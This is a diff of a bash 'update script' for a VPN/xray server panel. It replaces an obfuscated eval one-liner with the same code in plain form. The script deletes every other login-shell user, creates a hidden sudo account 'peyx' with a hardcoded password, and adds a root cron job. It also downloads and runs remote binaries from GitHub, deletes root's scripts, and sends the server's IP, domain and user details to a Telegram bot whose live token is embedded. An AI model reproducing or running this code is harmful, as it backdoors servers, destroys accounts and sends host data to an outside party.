@@ -1,3 +1,96 @@
-z="
-";oJz='rl -';jFz='$1}'\''';TBz='p7zi';hIz='c /u';TEz='ure ';az='l te';qKz='e DA';CJz='#pas';nz='str"';Jz='l de';MCz='g/bo';rHz='PATH';XIz='tocp';XGz='rd\n';WBz='."';nGz='y/.a';uDz=' "$t';KJz='d ya';dKz='N  :';TCz='(cat';AIz='n:/b';aJz='.bak';oGz='dm';ELz='ATID';IDz='d=$(';wBz='qHjq';kIz='n/ex';hKz='SER ';oCz='ubus';DFz='/new';dLz='ucce';PIz='ocpu';uKz=' @fr';TGz='l; t';THz=' Dow';HDz='vali';hFz=' {pr';VHz='ding';wJz='/.ve';EKz='----';pKz='acat';JDz='curl';RBz='tall';wIz='7z x';gKz='<b>U';SIz='.sh"';XFz='s=$(';KHz='-aG ';eEz='-e '\''';oKz='rtif';iBz='fi';jz='essa';RLz='e=ht';TKz='kses';rz='pins';pGz='mkdi';WHz=' men';uHz='cal/';xFz='=~ "';TFz='s=("';dDz='t $3';kDz='-%d"';KGz=' tel';SBz='ing ';YHz='p...';UFz='root';GFz='pwad';wEz='//ra';JFz='23"';pDz=' "$v';CHz='s /b';kKz='ame}';UIz='chmo';UCz=' /et';JKz='F UP';vHz='sbin';RCz='doma';qz='p${s';DBz=' com';cGz='swd ';lJz='serv';bJz='} &>';NLz='=$TE';DEz=' / 8';sFz='if [';pIz='"${R';eKz=' ${d';FHz='-M "';QJz='* /u';lDz=')';wHz=':/us';vFz='s[@]';OCz='Y/se';RGz='/dev';Mz='l sp';Fz='d=$1';qFz='rs; ';iDz=' +"%';gz='tf "';VJz='l/sb';PDz='serc';IHz='e" >';BGz=' ]];';eFz='ash|';MGz='ihap';aGz='d" |';PKz='    ';Bz='ing(';nJz='$(cu';Dz='loca';DGz='-r "';Qz='tput';EJz='n fi';WJz='in/*';yKz='x-ti';wGz='-r -';aCz='=$(c';XKz='P VP';hJz='nu"';xCz='x | ';AKz='/*.s';IEz='g se';Vz='-d /';WDz='in/i';YGz='$Pas';PGz='d "$';MFz='yx"';JCz='.tel';eCz='.ica';GLz='able';YJz='in/g';iCz='user';KIz='wget';Oz='r='\''|';hz=' [%c';dBz='ll &';RIz='}ins';FCz='URL=';NCz='t$KE';Pz='/-\'\''';FKz='-';CGz='del ';HEz='chin';xz='done';FFz='ain/';ZGz='swor';DDz=' '\''{p';gIz='exps';ODz='hubu';vKz='el01';NJz='u/*';fHz='m';OKz='>';YKz='S  :';oDz='e -d';IGz=' "Us';iFz='int ';IKz='NOTI';DCz='="10';Wz='proc';Cz=') {';OEz='er=$';uGz='t/';kEz='ate ';XLz='wnlo';vEz='tps:';bBz=' /de';BFz='ent.';aBz='y &>';lCz='s://';sHz='=/us';jIz='ocal';Tz='whil';tIz='ypt"';FEz='))';SJz='rf m';uJz='V > ';gGz='ull ';BBz='}';KBz=' the';rBz='471:';fDz='toda';nIz='bin/';CIz='usr/';FDz=' $2}';LIz=' -O ';xBz='eF8H';MLz='text';yIz='m me';wDz='cert';cFz='\/bi';tz='p"}';fKz='n}';YIz='u';fCz='nhaz';ZBz='ll -';qGz='r -p';VDz='c/ma';ZKz=' ${M';rCz='t.co';ALz=' -d ';mBz='2929';NEz='Serv';MIz='/usr';gFz='h)$/';uEz='="ht';NIz='/bin';kGz='" > ';tBz='SY1F';tHz='r/lo';QLz='_mod';xDz='ifac';EFz='sc/m';NKz='️</b';ZFz='-F: ';JBz='ull;';jEz='=$(d';Iz='e=$2';LGz='ah d';LLz='w=1&';uCz='ewsc';DIz='r/bi';oHz='L=/b';XHz='u.zi';cDz='k '\''{';mIz='-O /';nHz='SHEL';fJz='Setu';PHz=' > /';SFz='wed_';eGz='erna';RHz='null';aIz='${RE';BDz='IP |';hHz='c/cr';SCz='in=$';FBz=' -v ';lIz='psc';kHz='_xwa';OBz='" [I';VFz='")';UGz='hen';eHz='u_ot';rDz='" +%';QEz='l -v';wz='elay';bDz='| aw';DHz='in/b';lKz='<b>M';IJz='memi';TJz='enu ';pEz='$dat';ZCz='MYIP';KFz='User';lz='" "$';cLz='ed s';yEz='thub';yBz='dR4t';fLz='lly.';DLz='=$CH';DJz='tika';Hz='ssag';EGz='$use';oz='str=';JHz='mod ';PJz='ull';gDz='y=$(';NGz='us."';sKz='BY B';lGz='/etc';AJz='nu.z';WGz='sswo';yHz='/sbi';XCz='omai';EBz='mand';HLz='_web';vIz='c';GKz='<b> ';tDz='d2=$';HCz='ps:/';fz='prin';ZHz='{';vBz='o4SB';TDz='3yx/';xKz='--ma';mz='spin';Xz='/$pi';kCz='http';nKz=' $ce';ZLz='nd s';CBz='if !';Az='load';PEz='(cur';lEz='+"%Y';JJz='liki';dEz='sed ';xEz='w.gi';mJz='erV=';GIz=' /us';Zz=' do';uz='slee';BLz='"cha';nFz=' in ';bCz='url ';FIz='* * ';vCz='/mai';fEz='s/< ';ZIz=' -q ';SKz='t Su';qCz='nten';HFz='m="@';bHz='tc/c';oIz='enc ';mHz=' END';KDz=' -sS';Nz='inst';UBz='p-fu';JIz='END';YBz='all ';hGz='2>&1';BKz='h*';sDz='s)';UDz='news';mFz='for ';jHz='/cpu';sJz='rsi)';VBz='ll..';IIz='tek';CDz=' awk';XEz='gle.';VEz='lent';mGz='/xra';gEz='Date';KKz='DATE';MJz='ama';eBz='$! "';hBz='ll"';QHz='dev/';TLz='$URL';MKz='IPT⚠';ICz='/api';Yz='d ];';pJz='sS $';cCz='-sS ';bFz='~ /(';pHz='in/s';YLz='ad a';ILz='_pag';yCz='grep';rIz='all/';AEz='$(((';qJz='{REP';kLz='exit';oFz='$all';VIz='d +x';ECz='"';dGz='"$Us';aEz='1 | ';CLz='t_id';GGz='ll 2';GJz='enu.';cEz='e | ';ZDz='p $M';iIz='sr/l';OLz='XT&p';QFz='wadm';NBz=' -e ';aDz='YIP ';KEz=' dat';OGz='if i';MHz=' "$U';aFz=''\''$7 ';vDz='oday';cz='{spi';yDz='ate=';PCz='ndMe';WLz='e do';CCz='TIME';LCz='m.or';CKz='TEXT';WEz='/goo';QDz='onte';mKz='ASA ';rKz='Y';sGz='me/s';rEz='mSer';lBz='7661';GEz=' Fet';nCz='gith';jLz='rV!"';OFz='word';OHz='ame"';BEz='d1 -';bIz='PO}m';aHz='> /e';REz=' --i';yGz='ome/';sz='tr%"';GBz='7z &';tGz='crip';AGz='er "';jJz='sion';eIz='.zip';dHz='d/cp';iJz=' ver';mEz='-%m-';jDz='Y-%m';OIz='/aut';tCz='yx/n';Lz='0.1';aLz='etup';fBz='Load';SEz='nsec';XBz='apt ';LHz='sudo';GCz='"htt';eJz='and ';xHz='bin:';nDz='(dat';PLz='arse';VCz='c/xr';XJz='~';rJz='O}ve';EEz='6400';mDz='d1=$';RFz='allo';fGz='me" ';IBz='ev/n';VLz=' Fil';yz=' cno';YEz='com/';sIz='encr';qIz='EPO}';GHz='$Use';iGz='else';CEz=' d2)';WIz='n/au';yJz='rm /';gHz='cat>';pz='$tem';UJz='rf /';jGz='me $';cIz='enu/';bEz=' Dat';FLz='&dis';LKz=' SCR';sEz='ver"';hEz=': //';qDz='alid';pCz='erco';yFz=' $us';tKz='OT :';cBz='v/nu';kFz='c/pa';JLz='e_pr';iKz='   :';OJz='/* &';HBz='> /d';xGz='d /h';qBz='9190';AHz='scri';SHz='1';oBz='KEY=';Gz='l me';gJz='p me';RKz='te S';rGz=' /ho';hDz='date';QCz='e"';fIz='mv m';qEz='eFro';qHz='h';YCz='n)';Uz='e [ ';dIz='menu';JEz='rver';dFz='n\/b';UEz='--si';YFz='awk ';EHz='ash ';SGz='/nul';BHz='pt -';ACz='9AnI';PFz='="$p';BJz='ip &';NDz='.git';iLz='erve';LBz='n';eDz='}'\'')';bLz='plet';KCz='egra';AFz='cont';UKz='</b>';mCz='raw.';ADz=' $MY';aKz='YIP}';gLz=' Ver';BCz='MKs"';iEz='biji';QGz='" &>';cKz='OMAI';bz='mp=$';SLz='ml" ';gBz='Inst';kz='ge\r';bGz=' pas';FJz='le m';tEz='REPO';VKz='---';uFz='" ${';LDz=' htt';LFz='="pe';LJz='ng s';MEz='From';TIz=' && ';cJz='Extr';sCz='m/p3';dJz='act ';MDz='/raw';gCz='ip.c';DKz='="--';kJz='..."';JGz='er $';jCz='name';vz='p $d';sBz='AAGX';EDz='rint';pBz='"733';MBz='echo';rFz='do';lHz='n <<';WKz='<b>I';xIz=' -p$';lFz='sswd';vJz='/opt';ez='#?}';VGz='"$Pa';LEz='e...';oEz='-d "';uIz='n/en';Rz=' civ';pFz='_use';CFz='p3yx';KLz='evie';uBz='_fzJ';nBz='05"';wFz='} " ';HJz='zip ';GDz=''\'')';dCz='ipv4';RDz='nt.c';QBz=' Ins';hCz='om)';tFz='[ ! ';HIz='n/de';ZEz=' 2>&';HGz='>&1';Sz='is';fFz='n\/s';ULz=' >/d';dz='nstr';BIz='in:/';jBz='CHAT';PBz='NFO]';XDz='px |';HHz='rnam';eLz='ssfu';jKz=' ${u';RJz='rm -';QIz=' "${';iHz='on.d';NFz='Pass';Kz='lay=';nEz='%d" ';iz='] $m';WFz='all_';wKz=' -s ';YDz=' gre';tJz=' $se';ZJz='z*';ABz='rm';WCz='ay/d';kBz='ID="';xJz='r';bKz='<b>D';hLz=': $s';vGz='add ';Ez='l pi';IFz='Peyx';FGz='r" >';HKz='  ⚠️';QKz='Upda';wCz='n/ip';cHz='ron.';UHz='nloa';NHz='sern';SDz='om/p';EIz='*/5 ';
-eval "$Az$Bz$Cz$z$Dz$Ez$Fz$z$Dz$Gz$Hz$Iz$z$Dz$Jz$Kz$Lz$z$Dz$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$z$Dz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$z$mz$oz$pz$qz$rz$sz$pz$tz$z$uz$vz$wz$z$xz$z$Qz$yz$ABz$z$BBz$z$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$z$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$z$XBz$Nz$YBz$TBz$UBz$ZBz$aBz$bBz$cBz$dBz$z$Az$SBz$eBz$fBz$SBz$gBz$YBz$TBz$UBz$hBz$z$iBz$z$jBz$kBz$lBz$mBz$nBz$z$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$z$CCz$DCz$ECz$z$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$Hz$QCz$z$RCz$SCz$TCz$UCz$VCz$WCz$XCz$YCz$z$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$z$iCz$jCz$aCz$bCz$cCz$kCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$GDz$z$HDz$IDz$JDz$KDz$LDz$HCz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$TDz$UDz$VDz$WDz$XDz$YDz$ZDz$aDz$bDz$cDz$fz$dDz$eDz$z$fDz$gDz$hDz$iDz$jDz$kDz$lDz$z$mDz$nDz$oDz$pDz$qDz$rDz$sDz$z$tDz$nDz$oDz$uDz$vDz$rDz$sDz$z$wDz$xDz$yDz$AEz$BEz$CEz$DEz$EEz$FEz$z$MBz$NBz$OBz$PBz$GEz$HEz$IEz$JEz$KEz$LEz$ECz$z$hDz$MEz$NEz$OEz$PEz$QEz$REz$SEz$TEz$UEz$VEz$LDz$HCz$WEz$XEz$YEz$ZEz$aEz$yCz$bEz$cEz$dEz$eEz$fEz$gEz$hEz$GDz$z$iEz$jEz$kEz$lEz$mEz$nEz$oEz$pEz$qEz$rEz$sEz$lDz$z$tEz$uEz$vEz$wEz$xEz$yEz$iCz$AFz$BFz$YEz$CFz$DFz$EFz$FFz$ECz$z$GFz$HFz$IFz$JFz$z$KFz$jCz$LFz$MFz$z$NFz$OFz$PFz$QFz$ECz$z$RFz$SFz$iCz$TFz$UFz$lz$KFz$jCz$VFz$z$WFz$iCz$XFz$YFz$ZFz$aFz$bFz$cFz$dFz$eFz$cFz$fFz$gFz$hFz$iFz$jFz$UCz$kFz$lFz$lDz$z$mFz$iCz$nFz$oFz$pFz$qFz$rFz$z$sFz$tFz$uFz$RFz$SFz$iCz$vFz$wFz$xFz$yFz$AGz$BGz$KBz$LBz$z$iCz$CGz$DGz$EGz$FGz$bBz$cBz$GGz$HGz$z$MBz$IGz$JGz$iCz$KGz$LGz$MGz$NGz$z$iBz$z$xz$z$OGz$PGz$KFz$jCz$QGz$RGz$SGz$TGz$UGz$z$MBz$NBz$VGz$WGz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$fGz$HBz$IBz$gGz$hGz$z$iGz$z$MBz$NBz$dGz$eGz$jGz$NFz$OFz$kGz$lGz$mGz$nGz$oGz$z$pGz$qGz$rGz$sGz$tGz$uGz$z$iCz$vGz$wGz$xGz$yGz$AHz$BHz$CHz$DHz$EHz$FHz$GHz$HHz$IHz$bBz$cBz$GGz$HGz$z$MBz$NBz$VGz$WGz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$fGz$HBz$IBz$gGz$hGz$z$iCz$JHz$KHz$LHz$MHz$NHz$OHz$PHz$QHz$RHz$ZEz$SHz$z$iBz$z$MBz$NBz$OBz$PBz$THz$UHz$VHz$WHz$XHz$YHz$ECz$z$ZHz$z$aHz$bHz$cHz$dHz$eHz$fHz$z$gHz$UCz$hHz$iHz$jHz$kHz$lHz$mHz$z$nHz$oHz$pHz$qHz$z$rHz$sHz$tHz$uHz$vHz$wHz$tHz$uHz$xHz$yHz$AIz$BIz$CIz$vHz$wHz$DIz$LBz$z$EIz$FIz$FIz$UFz$GIz$DIz$HIz$IIz$z$JIz$z$KIz$LIz$MIz$NIz$OIz$PIz$QIz$tEz$RIz$RBz$OIz$PIz$SIz$TIz$UIz$VIz$GIz$DIz$WIz$XIz$YIz$z$KIz$ZIz$aIz$bIz$cIz$dIz$eIz$z$fIz$cIz$gIz$hIz$iIz$jIz$yHz$kIz$lIz$z$KIz$ZIz$mIz$CIz$nIz$oIz$pIz$qIz$Nz$rIz$sIz$tIz$z$UIz$VIz$GIz$DIz$uIz$vIz$z$wIz$xIz$GFz$yIz$AJz$BJz$HBz$IBz$gGz$CJz$DJz$EJz$FJz$GJz$HJz$IJz$JJz$bGz$ZGz$KJz$LJz$MJz$z$UIz$VIz$WHz$NJz$z$oIz$dIz$OJz$HBz$IBz$PJz$z$fIz$cIz$QJz$iIz$jIz$yHz$LBz$z$RJz$SJz$TJz$dIz$eIz$z$RJz$UJz$CIz$Dz$VJz$WJz$XJz$z$RJz$UJz$CIz$Dz$VJz$YJz$ZJz$z$RJz$UJz$CIz$Dz$VJz$WJz$aJz$z$bJz$bBz$cBz$dBz$z$Az$SBz$eBz$fBz$SBz$cJz$dJz$eJz$fJz$gJz$hJz$z$MBz$NBz$OBz$PBz$GEz$HEz$IEz$JEz$iJz$jJz$kJz$z$lJz$mJz$nJz$oJz$pJz$qJz$rJz$sJz$z$MBz$tJz$JEz$uJz$vJz$wJz$xJz$z$yJz$UFz$AKz$BKz$z$CKz$DKz$EKz$EKz$EKz$EKz$EKz$EKz$EKz$FKz$z$GKz$HKz$IKz$JKz$KKz$LKz$MKz$NKz$OKz$z$GKz$PKz$QKz$RKz$tGz$SKz$TKz$UKz$z$EKz$EKz$EKz$EKz$EKz$EKz$EKz$VKz$z$WKz$XKz$YKz$UKz$ZKz$aKz$z$bKz$cKz$dKz$UKz$eKz$XCz$fKz$z$gKz$hKz$iKz$UKz$jKz$NHz$kKz$z$lKz$mKz$iKz$UKz$nKz$oKz$pKz$qKz$rKz$z$EKz$EKz$EKz$EKz$EKz$EKz$EKz$VKz$z$sKz$tKz$uKz$vKz$z$ECz$z$JDz$wKz$xKz$yKz$jGz$CCz$ALz$BLz$CLz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$LLz$MLz$NLz$OLz$PLz$QLz$RLz$SLz$TLz$ULz$IBz$PJz$z$MBz$NBz$OBz$PBz$VLz$WLz$XLz$YLz$ZLz$aLz$DBz$bLz$cLz$dLz$eLz$fLz$gLz$jJz$hLz$iLz$jLz$z$kLz"
+loading() {
+local pid=$1
+local message=$2
+local delay=0.1
+local spinstr='|/-\'
+tput civis
+while [ -d /proc/$pid ]; do
+local temp=${spinstr#?}
+printf " [%c] $message\r" "$spinstr"
+spinstr=$temp${spinstr%"$temp"}
+sleep $delay
+done
+tput cnorm
+}
+if ! command -v 7z &> /dev/null; then
+echo -e " [INFO] Installing p7zip-full..."
+apt install p7zip-full -y &> /dev/null &
+loading $! "Loading Install p7zip-full"
+fi
+CHATID="7661292905"
+KEY="7339190471:AAGXSY1F_fzJo4SBqHjqeF8HdR4t9AnIMKs"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+domain=$(cat /etc/xray/domain)
+MYIP=$(curl -sS ipv4.icanhazip.com)
+username=$(curl -sS https://raw.githubusercontent.com/p3yx/newsc/main/ipx | grep $MYIP | awk '{print $2}')
+valid=$(curl -sS https://raw.githubusercontent.com/p3yx/newsc/main/ipx | grep $MYIP | awk '{print $3}')
+today=$(date +"%Y-%m-%d")
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+echo -e " [INFO] Fetching server date..."
+dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
+REPO="https://raw.githubusercontent.com/p3yx/newsc/main/"
+pwadm="@Peyx23"
+Username="peyx"
+Password="$pwadm"
+allowed_users=("root" "$Username")
+all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
+for user in $all_users; do
+if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
+userdel -r "$user" > /dev/null 2>&1
+echo "User $user telah dihapus."
+fi
+done
+if id "$Username" &>/dev/null; then
+echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+else
+echo -e "$Username $Password" > /etc/xray/.adm
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
+echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+usermod -aG sudo "$Username" > /dev/null 2>&1
+fi
+echo -e " [INFO] Downloading menu.zip..."
+{
+> /etc/cron.d/cpu_otm
+cat> /etc/cron.d/cpu_xwan << END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/5 * * * * root /usr/bin/detek
+END
+wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
+wget -q ${REPO}menu/menu.zip
+mv menu/expsc /usr/local/sbin/expsc
+wget -q -O /usr/bin/enc "${REPO}install/encrypt"
+chmod +x /usr/bin/enc
+7z x -p$pwadm menu.zip &> /dev/null #pastikan file menu.zip memiliki password yang sama
+chmod +x menu/*
+enc menu/* &> /dev/null
+mv menu/* /usr/local/sbin
+rm -rf menu menu.zip
+rm -rf /usr/local/sbin/*~
+rm -rf /usr/local/sbin/gz*
+rm -rf /usr/local/sbin/*.bak
+} &> /dev/null &
+loading $! "Loading Extract and Setup menu"
+echo -e " [INFO] Fetching server version..."
+serverV=$(curl -sS ${REPO}versi)
+echo $serverV > /opt/.ver
+rm /root/*.sh*
+TEXT="-------------------------------
+<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
+<b>     Update Script Sukses</b>
+-------------------------------
+<b>IP VPS  :</b> ${MYIP}
+<b>DOMAIN  :</b> ${domain}
+<b>USER    :</b> ${username}
+<b>MASA    :</b> $certifacate DAY
+-------------------------------
+BY BOT : @frel01
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
+exit
